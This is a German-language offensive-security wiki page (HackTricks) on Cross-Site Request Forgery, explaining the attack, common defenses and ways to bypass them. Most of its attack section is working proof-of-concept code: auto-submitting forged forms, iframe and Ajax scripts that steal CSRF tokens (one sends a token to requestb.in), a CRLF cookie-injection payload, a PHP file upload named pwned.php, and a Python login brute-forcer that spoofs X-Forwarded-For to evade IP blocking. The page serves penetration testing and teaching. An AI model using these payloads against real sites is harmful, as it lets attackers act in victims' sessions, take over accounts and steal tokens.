# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking-Einblicke**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert

**Treten Sie uns bei** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginnen Sie noch heute mit der Zusammenarbeit mit Top-Hackern!

## Cross-Site Request Forgery (CSRF) erkl√§rt

**Cross-Site Request Forgery (CSRF)** ist ein Typ von Sicherheitsl√ºcke, die in Webanwendungen gefunden wird. Sie erm√∂glicht es Angreifern, Aktionen im Namen ahnungsloser Benutzer auszuf√ºhren, indem sie deren authentifizierte Sitzungen ausnutzen. Der Angriff wird ausgef√ºhrt, wenn ein Benutzer, der in die Plattform eines Opfers eingeloggt ist, eine b√∂sartige Website besucht. Diese Website l√∂st dann Anfragen an das Konto des Opfers aus, indem sie Methoden wie das Ausf√ºhren von JavaScript, das Absenden von Formularen oder das Abrufen von Bildern verwendet.

### Voraussetzungen f√ºr einen CSRF-Angriff

Um eine CSRF-Sicherheitsl√ºcke auszunutzen, m√ºssen mehrere Bedingungen erf√ºllt sein:

1. **Identifizierung einer wertvollen Aktion**: Der Angreifer muss eine lohnenswerte Aktion finden, die ausgenutzt werden kann, wie z.B. das √Ñndern des Benutzerpassworts, der E-Mail oder das Erh√∂hen von Berechtigungen.
2. **Sitzungsverwaltung**: Die Sitzung des Benutzers sollte ausschlie√ülich √ºber Cookies oder den HTTP Basic Authentication-Header verwaltet werden, da andere Header nicht f√ºr diesen Zweck manipuliert werden k√∂nnen.
3. **Fehlen von unvorhersehbaren Parametern**: Die Anfrage sollte keine unvorhersehbaren Parameter enthalten, da diese den Angriff verhindern k√∂nnen.

### Schnell√ºberpr√ºfung

Sie k√∂nnten die Anfrage in Burp **aufzeichnen** und CSRF-Schutzma√ünahmen √ºberpr√ºfen und um es vom Browser aus zu testen, k√∂nnen Sie auf **Als fetch kopieren** klicken und die Anfrage √ºberpr√ºfen:

<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Schutz vor CSRF

Es k√∂nnen mehrere Gegenma√ünahmen implementiert werden, um sich vor CSRF-Angriffen zu sch√ºtzen:

* [**SameSite-Cookies**](hacking-with-cookies/#samesite): Dieses Attribut verhindert, dass der Browser Cookies zusammen mit Cross-Site-Anfragen sendet. [Mehr √ºber SameSite-Cookies](hacking-with-cookies/#samesite).
* [**Cross-Origin Resource Sharing**](cors-bypass.md): Die CORS-Richtlinie der Opferseite kann die Durchf√ºhrbarkeit des Angriffs beeinflussen, insbesondere wenn der Angriff erfordert, dass die Antwort von der Opferseite gelesen wird. [Erfahren Sie mehr √ºber CORS-Bypass](cors-bypass.md).
* **Benutzerverifizierung**: Das Auffordern des Benutzerpassworts oder das L√∂sen eines Captchas kann die Absicht des Benutzers best√§tigen.
* **√úberpr√ºfen von Referrer- oder Origin-Headern**: Die Validierung dieser Header kann dazu beitragen, sicherzustellen, dass Anfragen von vertrauensw√ºrdigen Quellen stammen. Eine sorgf√§ltige Gestaltung von URLs kann jedoch schlecht implementierte √úberpr√ºfungen umgehen, wie z.B.:
* Verwendung von `http://mal.net?orig=http://example.com` (URL endet mit der vertrauensw√ºrdigen URL)
* Verwendung von `http://example.com.mal.net` (URL beginnt mit der vertrauensw√ºrdigen URL)
* **√Ñndern von Parameternamen**: Das √Ñndern von Parameternamen in POST- oder GET-Anfragen kann helfen, automatisierte Angriffe zu verhindern.
* **CSRF-Token**: Die Integration eines eindeutigen CSRF-Tokens in jede Sitzung und die Anforderung dieses Tokens in nachfolgenden Anfragen k√∂nnen das Risiko von CSRF erheblich verringern. Die Effektivit√§t des Tokens kann durch die Durchsetzung von CORS verbessert werden.

Das Verst√§ndnis und die Implementierung dieser Abwehrma√ünahmen sind entscheidend f√ºr die Aufrechterhaltung der Sicherheit und Integrit√§t von Webanwendungen.

## Abwehrma√ünahmen umgehen

### Von POST zu GET

Vielleicht ist das Formular, das Sie missbrauchen m√∂chten, darauf vorbereitet, eine **POST-Anfrage mit einem CSRF-Token zu senden**, aber Sie sollten **√ºberpr√ºfen**, ob ein **GET** ebenfalls **g√ºltig** ist und ob beim Senden einer GET-Anfrage das **CSRF-Token immer noch validiert wird**.

### Fehlen des Tokens

Anwendungen k√∂nnten einen Mechanismus implementieren, um **Tokens zu validieren**, wenn sie vorhanden sind. Es entsteht jedoch eine Sicherheitsl√ºcke, wenn die Validierung vollst√§ndig √ºbersprungen wird, wenn der Token fehlt. Angreifer k√∂nnen dies ausnutzen, indem sie den Parameter entfernen, der den Token tr√§gt, nicht nur seinen Wert. Dies erm√∂glicht es ihnen, den Validierungsprozess zu umgehen und einen Cross-Site Request Forgery (CSRF)-Angriff effektiv durchzuf√ºhren.

### CSRF-Token ist nicht an die Benutzersitzung gebunden

Anwendungen, die CSRF-Tokens **nicht an Benutzersitzungen binden**, stellen ein erhebliches **Sicherheitsrisiko** dar. Diese Systeme √ºberpr√ºfen Tokens gegen einen **globalen Pool**, anstatt sicherzustellen, dass jedes Token an die initiierende Sitzung gebunden ist.

So nutzen Angreifer dies aus:

1. **Authentifizieren** sich mit ihrem eigenen Konto.
2. **Erhalten ein g√ºltiges CSRF-Token** aus dem globalen Pool.
3. **Verwenden dieses Token** in einem CSRF-Angriff gegen ein Opfer.

Diese Sicherheitsl√ºcke erm√∂glicht es Angreifern, unbefugte Anfragen im Namen des Opfers zu stellen, indem sie den unzureichenden Token-Validierungsmechanismus der Anwendung ausnutzen.

### Methodenumgehung

Wenn die Anfrage eine "**seltsame**" **Methode** verwendet, √ºberpr√ºfen Sie, ob die **Methode** **√úberschreibungsfunktion** funktioniert. Wenn z.B. eine **PUT**-Methode verwendet wird, k√∂nnen Sie versuchen, eine **POST**-Methode zu verwenden und zu **senden**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Dies k√∂nnte auch funktionieren, indem der **\_method-Parameter innerhalb einer POST-Anfrage** gesendet wird oder indem die **Header** verwendet werden:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Umgehung des benutzerdefinierten Header-Tokens

Wenn die Anfrage einen **benutzerdefinierten Header** mit einem **Token** zur Anfrage als **CSRF-Schutzmethode** hinzuf√ºgt, dann:

* Testen Sie die Anfrage ohne das **angepasste Token und auch Header**.
* Testen Sie die Anfrage mit genau **gleicher L√§nge, aber unterschiedlichem Token**.

### CSRF-Token wird durch ein Cookie √ºberpr√ºft

Anwendungen k√∂nnen CSRF-Schutz implementieren, indem sie den Token sowohl in einem Cookie als auch in einem Anfrageparameter duplizieren oder indem sie ein CSRF-Cookie setzen und √ºberpr√ºfen, ob der im Backend gesendete Token mit dem Cookie √ºbereinstimmt. Die Anwendung validiert Anfragen, indem sie pr√ºft, ob der Token im Anfrageparameter mit dem Wert im Cookie √ºbereinstimmt.

Diese Methode ist jedoch anf√§llig f√ºr CSRF-Angriffe, wenn die Website Fehler aufweist, die es einem Angreifer erm√∂glichen, ein CSRF-Cookie im Browser des Opfers zu setzen, z.B. durch eine CRLF-Sicherheitsl√ºcke. Der Angreifer kann dies ausnutzen, indem er ein irref√ºhrendes Bild l√§dt, das das Cookie setzt, gefolgt von der Initiierung des CSRF-Angriffs.

Nachfolgend ein Beispiel, wie ein Angriff strukturiert sein k√∂nnte:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Beachten Sie, dass, wenn das **CSRF-Token mit dem Sitzungscookie verkn√ºpft ist, dieser Angriff nicht funktioniert**, da Sie dem Opfer Ihre Sitzung mitteilen m√ºssten und somit sich selbst angreifen w√ºrden.
{% endhint %}

### √Ñnderung des Inhalts-Typs

Gem√§√ü [**diesem Link**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) sind zur **Vermeidung von Preflight-Anfragen** bei Verwendung der **POST**-Methode die folgenden Content-Type-Werte zul√§ssig:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Beachten Sie jedoch, dass die **Serverlogik variieren kann**, abh√§ngig vom verwendeten **Content-Type**, daher sollten Sie die genannten Werte und andere wie **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ ausprobieren.

Beispiel (von [hier](https://brycec.me/posts/corctf\_2021\_challenges)) zum Senden von JSON-Daten als text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Umgehen von Preflight-Anfragen f√ºr JSON-Daten

Beim Versuch, JSON-Daten √ºber eine POST-Anfrage zu senden, ist es in einem HTML-Formular nicht direkt m√∂glich, `Content-Type: application/json` zu verwenden. Ebenso initiiert die Verwendung von `XMLHttpRequest` f√ºr diesen Inhaltstyp eine Preflight-Anfrage. Dennoch gibt es Strategien, um diese Einschr√§nkung m√∂glicherweise zu umgehen und zu √ºberpr√ºfen, ob der Server die JSON-Daten verarbeitet, unabh√§ngig vom Content-Type:

1. **Verwendung alternativer Content-Typen**: Verwenden Sie `Content-Type: text/plain` oder `Content-Type: application/x-www-form-urlencoded`, indem Sie `enctype="text/plain"` im Formular festlegen. Mit diesem Ansatz wird getestet, ob das Backend die Daten unabh√§ngig vom Content-Type verwendet.
2. **√Ñndern des Content-Typs**: Um eine Preflight-Anfrage zu vermeiden und gleichzeitig sicherzustellen, dass der Server den Inhalt als JSON erkennt, k√∂nnen Sie die Daten mit `Content-Type: text/plain; application/json` senden. Dies l√∂st keine Preflight-Anfrage aus, k√∂nnte aber vom Server korrekt verarbeitet werden, wenn er konfiguriert ist, `application/json` zu akzeptieren.
3. **SWF-Flash-Datei-Nutzung**: Eine weniger verbreitete, aber machbare Methode besteht darin, eine SWF-Flash-Datei zu verwenden, um solche Einschr√§nkungen zu umgehen. F√ºr ein tieferes Verst√§ndnis dieser Technik siehe [diesen Beitrag](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Referrer / Origin-Pr√ºfung umgehen

**Vermeiden des Referrer-Headers**

Anwendungen k√∂nnen den 'Referer'-Header nur validieren, wenn er vorhanden ist. Um zu verhindern, dass ein Browser diesen Header sendet, kann das folgende HTML-Meta-Tag verwendet werden:
```xml
<meta name="referrer" content="never">
```
Dies stellt sicher, dass der 'Referer'-Header ausgelassen wird und m√∂glicherweise Validierungspr√ºfungen in einigen Anwendungen umgangen werden.

**Regexp-Bypasses**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Um den Domainnamen des Servers in der URL festzulegen, den der Referrer innerhalb der Parameter senden wird, k√∂nnen Sie Folgendes tun:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEAD Methode umgehen**

Der erste Teil [**dieses CTF-L√∂sungsberichts**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) erkl√§rt, dass im [Oak-Quellcode](https://github.com/oakserver/oak/blob/main/router.ts#L281) ein Router so eingestellt ist, dass **HEAD-Anfragen als GET-Anfragen behandelt** werden, ohne Antwortk√∂rper - ein g√§ngiger Workaround, der nicht einzigartig f√ºr Oak ist. Anstatt eines spezifischen Handlers, der mit HEAD-Anfragen umgeht, werden sie einfach **dem GET-Handler √ºbergeben, aber die App entfernt einfach den Antwortk√∂rper**.

Daher k√∂nnten Sie, wenn eine GET-Anfrage eingeschr√§nkt ist, einfach **eine HEAD-Anfrage senden, die als GET-Anfrage verarbeitet wird**.

## **Beispiel f√ºr Exploits**

### **CSRF-Token exfiltrieren**

Wenn ein **CSRF-Token** als **Schutzma√ünahme** verwendet wird, k√∂nnten Sie versuchen, es durch eine [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)-Verwundbarkeit oder eine [**Dangling Markup**](dangling-markup-html-scriptless-injection/)-Verwundbarkeit **exfiltrieren**.

### **GET mit HTML-Tags**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Andere HTML5-Tags, die verwendet werden k√∂nnen, um automatisch eine GET-Anfrage zu senden, sind:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Form GET-Anfrage
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Form POST-Anfrage
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Form POST-Anfrage √ºber iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST-Anfrage**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST-Anfrage
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST-Anforderung v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Form POST-Anfrage innerhalb eines Iframes
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRF-Token stehlen und eine POST-Anfrage senden**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRF-Token stehlen und einen POST-Request mithilfe eines iframes, eines Formulars und Ajax senden**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Stehlen Sie CSRF-Token und senden Sie eine POST-Anfrage mithilfe eines iframes und eines Formulars**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Token stehlen und √ºber 2 iframes senden**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POST CSRF-Token mit Ajax stehlen und einen Beitrag mit einem Formular senden**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF mit Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Login Brute Force

Der Code kann verwendet werden, um ein Login-Formular mithilfe eines CSRF-Tokens zu Brute-Forcen (Es verwendet auch den Header X-Forwarded-For, um zu versuchen, eine m√∂gliche IP-Blacklist zu umgehen):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Werkzeuge <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Referenzen

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Treten Sie dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-J√§gern zu kommunizieren!

**Hacking-Einblicke**\
Besch√§ftigen Sie sich mit Inhalten, die sich mit dem Nervenkitzel und den Herausforderungen des Hackens befassen

**Echtzeit-Hack-News**\
Bleiben Sie mit der schnelllebigen Hacking-Welt durch Echtzeitnachrichten und Einblicke auf dem Laufenden

**Neueste Ank√ºndigungen**\
Bleiben Sie √ºber die neuesten Bug-Bounties und wichtige Plattformupdates informiert

**Treten Sie uns bei** auf [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginnen Sie noch heute mit Top-Hackern zusammenzuarbeiten!

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
